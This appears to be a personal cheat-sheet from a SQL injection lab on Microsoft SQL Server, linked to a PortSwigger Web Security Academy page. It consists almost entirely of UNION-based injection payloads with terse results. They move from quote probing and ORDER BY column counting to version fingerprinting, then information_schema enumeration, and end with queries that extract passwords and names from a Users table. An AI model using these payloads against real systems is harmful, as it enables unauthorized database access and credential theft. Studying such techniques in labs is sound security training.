# MSSQL

```
Going with a parameter.
' 500 error
'' ok

' ORDER BY 1-- ok
' ORDER BY 2-- ok
' ORDER BY 3-- ok.
' ORDER BY 4-- nope.

' UNION SELECT NULL,NULL,NULL-- ok
' UNION SELECT 'a',NULL,NULL-- ok

' UNION SELECT 'a',NULL,'a'-- nope
' UNION SELECT 'a',NULL,'1'-- ok.
' UNION SELECT @@version,NULL,NULL-- ok.
```

Microsoft SQL Server 2012

https://portswigger.net/web-security/sql-injection/examining-the-database

`SELECT * FROM information_schema.tables`

`TABLE_CATALOG TABLE_SCHEMA TABLE_NAME TABLE_TYPE`

```
' UNION SELECT TABLE_NAME,NULL,NULL FROM information_schema.tables--
```

`SELECT * FROM information_schema.columns WHERE table_name = 'Users'`

`TABLE_CATALOG TABLE_SCHEMA TABLE_NAME COLUMN_NAME DATA_TYPE`

```
' UNION SELECT COLUMN_NAME,NULL,NULL FROM information_schema.columns WHERE table_name = 'Users'--
```

```
' UNION SELECT pass,NULL,NULL FROM Users--
' UNION SELECT name,NULL,NULL FROM Users--
```
